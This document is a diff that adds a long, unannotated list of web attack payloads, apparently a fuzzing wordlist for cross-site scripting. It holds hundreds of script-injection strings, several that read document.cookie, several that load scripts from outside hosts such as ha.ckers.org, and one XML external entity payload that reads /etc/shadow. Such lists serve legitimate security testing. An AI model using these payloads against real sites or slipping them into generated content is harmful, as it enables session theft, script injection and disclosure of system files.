@@ -1,0 +1,2790 @@
+﻿<!--[if<img src=x onerror=javascript:alert(1)//]> -->
+<DIV STYLE="width:expression(javascript:alert(1));">
+<img src=# onerror\x3D"javascript:alert(1)" >
+<IMG SRC=javascript:alert('XSS')>
+<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
+<var onmouseover="prompt(1)">On Mouse Over</var>
+<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
+<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<img SRC="javascript:document.vulnerable=true;"
+"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
+<;BODY ONLOAD=alert(';XSS';)>;
+<IMG SRC=x onloadeddata="alert(String.fromCharCode(88,83,83))">
+<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
+<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<IMG SRC=x onpopstate="alert(String.fromCharCode(88,83,83))">
+<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+“><s”%2b”cript>alert(document.cookie)</script>
+<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
+<svg/onload​=alert/*1337*/(1)>
+&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
+<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
+<IMG SRC=javascript:alert('XSS')>       
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
+<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
+<h1><font color=blue>hellox worldss</h1>
+&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
+<video onerror="javascript:javascript:alert(1)"><source>
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
+<script\x20type="text/javascript">javascript:alert(1);</script>
+"ontouchend%3Dprompt%281%29+class%3Dd3rk+
+/<script>alert(1234)</script>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
+<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
+//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));
+ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
+<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser
+%22;alert%28%27RVRSH3LL_XSS%29//
+<img src="javascript:document.vulnerable=true;">
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
+<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+&#x000003c;
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;
+"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
+"`'><script>\xE2\x80\x82javascript:alert(1)</script>
+ <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+<frameset onload=javascript:javascript:alert(1)></frameset>
+`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
+<img \x00src=x onerror="javascript:alert(1)">
+ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;
+<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
+<script src=%(jscript)s></script>
+<div style="behaviour: url([link to code]);">
+<IMG SRC=x onkeydown="alert(String.fromCharCode(88,83,83))">
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+"><body/onload="{x:onerror=alert};x"	
+<SCRIPT SRC="%(jpg)s"></SCRIPT>
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
+<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
+"`'><script>\x0Bjavascript:alert(1)</script>
+<img src=x\x12onerror="javascript:alert(1)">
+<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
+<! foo="><script>alert(1)</script>">
+<STYLE>@import'%(css)s';</STYLE>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
+<;SCRIPT>;a=/XSS/
+<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
+<style><img src="</style><img src=x onerror=alert(XSS)//">
+<img src\x32=x onerror="javascript:alert(1)">
+<?='<SCRIPT>alert("XSS")</SCRIPT>'?>
+"`'><script>\xE2\x80\x83javascript:alert(1)</script>
+`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
+&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
+<img src\x11=x onerror="javascript:alert(1)">
+"`'><script>\xE2\x80\x89javascript:alert(1)</script>
+<h1 onfocus=alert(1) autofocus tabindex=1>
+<img src=x\x12onerror="javascript:alert(1)">
+<img src ?itworksonchrome?\/onerror = alert(1)
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+"`'><script>\x3Bjavascript:alert(1)</script>
+<;IMG SRC=javascript:alert(';XSS';)>;
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+<img DYNSRC="javascript:document.vulnerable=true;">
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+<IMG SRC=x onoffline="alert(String.fromCharCode(88,83,83))">
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<ol onfocus=alert(1) autofocus tabindex=1>	
+test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
+<;STYLE>;li {list-style-image: url(";javascript:alert(&#39;XSS&#39;)";);}<;/STYLE>;<;UL>;<;LI>;XSS
+<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
+<img src="/" =_=" title="onerror='prompt(1)'">
+<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
+"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+<;/br style=a:expression(alert())>;
+ABC<div style="x:\x00expression(javascript:alert(1)">DEF
+<IMG SRC=x onmousedown="alert(String.fromCharCode(88,83,83))">
+<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<a onmouseover="alert(document.cookie)">xxs link</a>
+<img src\x47=x onerror="javascript:alert(1)">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+&#X0003C;
+<;DIV STYLE=";background-image: url(&;#1;javascript:alert(';XSS';))";>;
+&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;
+<svg><script onlypossibleinopera:-)> alert(1)
+<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
+<a onmouseover="alert(document.cookie)">xxs link</a>
+<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
+<;FRAMESET>;<;FRAME SRC=";javascript:alert(';XSS';);";>;<;/FRAMESET>;
+&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<img src="x` `<script>javascript:alert(1)</script>"` `>
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
+<IFRAME width="420" height="315" frameborder="0" onload="alert(document.cookie)"></IFRAME>
+<IMG+DYNSRC="javascript:alert(1);">
+\x3C
+<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
+exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+&lt;HTML&gt;&lt;BODY&gt;
+<link rel="stylesheet" href="javascript:document.vulnerable=true;">
+<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
+<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
+<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
+<img\x32src=x onerror="javascript:alert(1)">
+&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
+&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+"`'><script>\x2Bjavascript:alert(1)</script>
+<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
+">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<IMG SRC="livescript:[code]">
+<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
+<script+src=">"+src="http://yoursite.com/xss.js?69,69"></script>
+&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
+<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<IMG SRC=x onpageshow="alert(String.fromCharCode(88,83,83))">
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
+'); alert('XSS
+<script>/* *\x2A/javascript:alert(1)// */</script>
+&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
+<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
+"`'><script>\x2Bjavascript:alert(1)</script>
+<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+"><STYLE>@import"javascript:alert('XSS')";</STYLE>
+<input value=<><iframe/src=javascript:confirm(1)
+">>>>>><marquee>RXSS</marquee></head><abc%3E</script><script>alert(document.cookie)</script><meta
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+<! foo="><script>alert(1)</script>">
+¼script¾alert(¢XSS¢)¼/script¾
+<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<frameset onload=javascript:javascript:alert(1)></frameset>
+ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+<img src="mocha:document.vulnerable=true;">
+<img src="livescript:document.vulnerable=true;">
+<img \x12src=x onerror="javascript:alert(1)">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
+<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
+<img\x47src=x onerror="javascript:alert(1)">
+<form><isindex formaction="javascript&colon;confirm(1)"
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<SCRIPT> alert(“XSS”); </SCRIPT>
+<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
+<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
+";a=prompt,a()//
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
+&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+[<blockquote cite="]">[" onmouseover="alert('RVRSH3LL_XSS');" ]
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+"><img src=x onerror=window.open('https://www.google.com/');>
+<img dynsrc="javascript:document.vulnerable=true;">
+¼script¾alert(¢XSS¢)¼/script¾
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<img src\x13=x onerror="javascript:alert(1)">
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
+<hgroup onfocus=alert(1) autofocus tabindex=1>	
+<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
+<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
+&lt
+<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
+<IMG SRC=# onmouseover="alert('xxs')">
+<embed code=%(scriptlet)s></embed>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+<// style=x:expression\28javascript:alert(1)\29>
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+><h1><IFRAME width="420" height="315" frameborder="0" onmouseover="document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
+<script <B>document.vulnerable=true;</script>
+<script\x20>javascript:alert(1)</script>
+<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
+<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;
+ABC<div style="x:expression\x00(javascript:alert(1)">DEF
+perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
+<table BACKGROUND="javascript:document.vulnerable=true;">
+\";alert('XSS');//
+'';!--"<XSS>=&{()}
+<image src/onerror=prompt(8)>
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<img src=asdf onerror=alert(document.cookie)>
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
+<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+!--" /><script>alert('xss');</script>
+<img src="javascript:alert(1)">
+<img src="javascript:document.vulnerable=true;">
+<image/src/onerror=prompt(8)>
+<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
+<bgsound src="javascript:document.vulnerable=true;">
+"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
+<form><button formaction="javascript:javascript:alert(1)">X
+&#X003C
+'-prompt(8)-'
+<script src="data:\xD4\x8F,javascript:alert(1)"></script>
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+“><s”%2b”cript>alert(document.cookie)</script>
+<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
+<BASE HREF="javascript:alert('XSS');//">
+ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
+<svg%20onload=alert%28document.domain%29>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+<style><!--</style><script>document.vulnerable=true;//--></script>
+&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
+<div style="binding: url([link to code]);">
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+"`'><script>-javascript:alert(1)</script>
+<script src=http://yoursite.com/your_files.js></script>
+<svg contentScriptType=text/vbs><script>MsgBox+1
+"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+"><script>alert('XSS')</script>
+<svg><image href=1 onerror=alert(1)>	
+<script>alert(String.fromCharCode(88,83,83))</script> 
+&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
+<title onpropertychange=javascript:alert(1)></title><title title=>
+%253cscript%253ealert(1)%253c/script%253e
+<XSS STYLE="xss:expression(alert('XSS'))">
+<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
+&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
+<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;
+"`'><script>\xE3\x80\x80javascript:alert(1)</script>
+/me/m%3C/script%3E%3Csvg/onload=prompt(document.domain)%3E
+<IMG SRC=x ondurationchange="alert(String.fromCharCode(88,83,83))">
+&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
+<img/src=`%00` onerror=this.onerror=confirm(1)
+<IMG SRC="javascript:alert('XSS');">
+'';!--"<XSS>=&{()}
+<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
+<IMG SRC=&{javascript:alert(1);};>
+<;!--[if gte IE 4]>;           
+<script <B>document.vulnerable=true;</script>
+"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
+<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
+<IMG SRC=x ondrag="alert(String.fromCharCode(88,83,83))">
+&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+&#X03c;
+<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+"><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<INPUT TYPE="BUTTON" action="alert('XSS')"/>
+&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
+&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
+&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;
+<IMG SRC="javascript:javascript:alert(1)"
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;
+&{document.vulnerable=true;};
+<!--<img src="--><img src=x onerror=javascript:alert(1)//">
+<IMG SRC=x onkeyup="alert(String.fromCharCode(88,83,83))">
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<IMG DYNSRC="javascript:alert('XSS')">
+<;scrscriptipt>;alert(1)<;/scrscriptipt>;
+<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<a href="jav&#65ascript:javascript:alert(1)">test1</a>
+ <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+http://www.<script>alert(1)</script .com
+<IMG SRC="jav	ascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
+<img/src=`%00` onerror=this.onerror=confirm(1) 
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<script>for((i)in(self))eval(i)(1)</script>
+<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<BODY ONLOAD=javascript:javascript:alert(1)>
+<style type="text/javascript">document.vulnerable=true;</style>
+<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
+&#x003c
+<svg><script ?>alert(1)
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
+<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
+<XSS STYLE="behavior: url(xss.htc);">
+"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<img src\x09=x onerror="javascript:alert(1)">
+%26%2302java%26%23115cript:alert(document.domain)
+<IMG SRC=x onresize="alert(String.fromCharCode(88,83,83))">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;
